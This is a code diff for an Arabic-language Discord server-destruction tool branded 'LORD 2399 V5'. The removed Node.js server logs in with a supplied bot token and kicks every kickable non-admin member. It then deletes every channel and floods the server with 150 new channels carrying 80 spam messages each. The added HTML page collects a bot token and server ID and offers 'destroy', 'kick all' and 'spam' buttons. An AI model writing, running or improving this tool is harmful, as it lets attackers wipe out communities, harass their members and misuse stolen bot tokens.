@@ -1,69 +1,107 @@
-const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits } = require('discord.js');
-const express = require('express');
-const cors = require('cors');
-const path = require('path');
-
-const app = express();
-app.use(cors());
-app.use(express.json());
-
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-
-app.post('/execute', async (req, res) => {
-    const { token, guildId, action, customName, customMsg } = req.body;
-    
-    // تعريف البوت بجميع الصلاحيات الممكنة (Intents)
-    const client = new Client({ 
-        intents: [
-            GatewayIntentBits.Guilds,
-            GatewayIntentBits.GuildMembers,
-            GatewayIntentBits.GuildMessages,
-            GatewayIntentBits.MessageContent
-        ] 
-    });
-
-    try {
-        await client.login(token);
-        const guild = await client.guilds.fetch(guildId);
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LORD V5 | ULTIMATE</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Orbitron:wght@800&display=swap');
         
-        if (!guild) return res.status(404).send({ status: '❌ السيرفر غير موجود!' });
+        body { margin: 0; background: #000; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Cairo', sans-serif; color: #fff; }
+        #v-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; object-fit: cover; filter: brightness(0.6); }
+        
+        .card { 
+            width: 88%; max-width: 380px; 
+            background: rgba(0, 0, 0, 0.3); 
+            border: 2px solid #f00; 
+            border-radius: 20px; padding: 30px; 
+            text-align: center; backdrop-filter: blur(10px); 
+            box-shadow: 0 0 20px #f00, inset 0 0 10px #f00;
+            animation: glow 2s infinite alternate;
+        }
 
-        res.status(200).send({ status: '⚡ بدأت القوة التدميرية V5!' });
+        @keyframes glow { from { box-shadow: 0 0 10px #f00; } to { box-shadow: 0 0 30px #f00; } }
 
-        const name = customName || "Lord 2399 V5";
-        const msg = customMsg || "# LORD 2399 V5 ON TOP\nhttps://discord.gg/2399k";
+        h1 { font-family: 'Orbitron'; color: #f00; text-shadow: 0 0 10px #f00; font-size: 22px; margin-bottom: 20px; }
+        input, textarea { width: 100%; padding: 12px; margin: 10px 0; background: rgba(255,255,255,0.1); border: 1px solid #f00; color: #fff; border-radius: 10px; outline: none; box-sizing: border-box; }
+        
+        .btn { width: 100%; padding: 15px; background: #f00; color: #fff; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; transition: 0.3s; margin-top: 10px; text-transform: uppercase; }
+        .btn:hover { background: #b00; transform: scale(1.02); }
+        .loader { border: 5px solid #222; border-top: 5px solid #f00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
 
-        // قوة مضاعفة x10
-        if (action === 'تدمير' || action === 'طرد') {
-            const members = await guild.members.fetch();
-            members.forEach(m => {
-                if (m.kickable && !m.permissions.has(PermissionFlagsBits.Administrator)) {
-                    m.kick('2399 Power').catch(() => {});
-                }
+    <video autoplay loop muted playsinline id="v-bg">
+        <source src="https://a.top4top.io/m_3745ydpjj9.mp4" type="video/mp4">
+    </video>
+
+    <!-- صفحة 1: جاري الدخول -->
+    <div id="p1" class="card">
+        <h1 style="font-family:'Cairo'">جاري فحص النظام...</h1>
+        <div class="loader"></div>
+        <p>LORD 2399 V5 SYSTEM</p>
+    </div>
+
+    <!-- صفحة 2: التعهد -->
+    <div id="p2" class="card hidden">
+        <h1>ACCESS DENIED</h1>
+        <div style="border: 1px dashed #f00; padding: 15px; margin-bottom: 20px; font-size: 13px;">
+            <p>يجب الانضمام للمقر أولاً</p>
+            <a href="https://discord.gg/2399k" target="_blank" style="color:#f00; font-weight:bold;">DISCORD SERVER</a>
+            <hr style="border: 0.5px solid #444; margin: 15px 0;">
+            <label><input type="checkbox" id="c"> أتعهد بالدخول والالتزام</label>
+        </div>
+        <button class="btn" onclick="go(2,3)">استمرار</button>
+    </div>
+
+    <!-- صفحة 3: تسجيل الدخول -->
+    <div id="p3" class="card hidden">
+        <h1>LOGIN V5</h1>
+        <input type="password" id="tk" placeholder="BOT TOKEN">
+        <input type="text" id="id" placeholder="SERVER ID">
+        <button class="btn" onclick="go(3,4)">دخول للوحة</button>
+    </div>
+
+    <!-- صفحة 4: اللوحة النهائية -->
+    <div id="p4" class="card hidden">
+        <h1>Tools Lord v4 2399</h1>
+        <input type="text" id="nm" placeholder="اسم الرومات">
+        <textarea id="ms" placeholder="رسالة التدمير" rows="2"></textarea>
+        <button class="btn" onclick="run('تدمير')" style="background: linear-gradient(to bottom, #f00, #400);">تدمير شامل + طرد 💀</button>
+        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:10px;">
+            <button class="btn" onclick="run('طرد')" style="font-size:10px; background:#222; border:1px solid #f00;">طرد الكل</button>
+            <button class="btn" onclick="run('سبام')" style="font-size:10px; background:#222; border:1px solid #f00;">سبام فقط</button>
+        </div>
+    </div>
+
+    <script>
+        // التحميل التلقائي
+        setTimeout(() => go(1, 2), 3000);
+
+        function go(f, t) {
+            if(f==2 && !document.getElementById('c').checked) return alert("وافق على التعهد!");
+            document.getElementById('p'+f).classList.add('hidden');
+            document.getElementById('p'+t).classList.remove('hidden');
+        }
+
+        async function run(a) {
+            const res = await fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    token: document.getElementById('tk').value,
+                    guildId: document.getElementById('id').value,
+                    customName: document.getElementById('nm').value,
+                    customMsg: document.getElementById('ms').value,
+                    action: a
+                })
             });
+            const d = await res.json();
+            alert(d.status);
         }
-
-        if (action === 'تدمير') {
-            // مسح الرومات بلحظة واحدة
-            const channels = await guild.channels.fetch();
-            channels.forEach(ch => ch.delete().catch(() => {}));
-
-            // إنشاء رومات (سرعة جنونية)
-            for (let i = 0; i < 150; i++) {
-                setTimeout(() => {
-                    guild.channels.create({ 
-                        name: name, 
-                        type: ChannelType.GuildText 
-                    }).then(ch => {
-                        for(let j=0; j<80; j++) ch.send(msg).catch(() => {});
-                    }).catch(() => {});
-                }, i * 30); // 30 ملي ثانية فقط!
-            }
-        }
-    } catch (err) {
-        console.error("Critical Error:", err.message);
-        if (!res.headersSent) res.status(500).send({ status: '❌ فشل الاتصال: تأكد من التوكن والـ Intents' });
-    }
-});
-
-app.listen(process.env.PORT || 3000, '0.0.0.0');
+    </script>
+</body>
+</html>
